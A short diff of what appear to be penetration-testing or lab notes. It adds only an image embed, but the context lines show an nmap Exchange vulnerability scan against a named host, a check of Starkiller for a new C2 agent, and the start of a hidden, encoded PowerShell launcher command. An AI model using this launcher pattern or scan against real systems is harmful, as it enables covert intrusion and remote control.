@@ -47,6 +47,7 @@ nmap --script http-vuln-exchange.nse mail.draconem.io
 3. Click carried out and check starkiller for a new agent.
 **Remember:** The Statements field should start with `/c powershell -noP -sta -w 1 -enc ...`
 
+![[Pasted image 20240324032203.png]]
 ### Enumerate Users
 
 
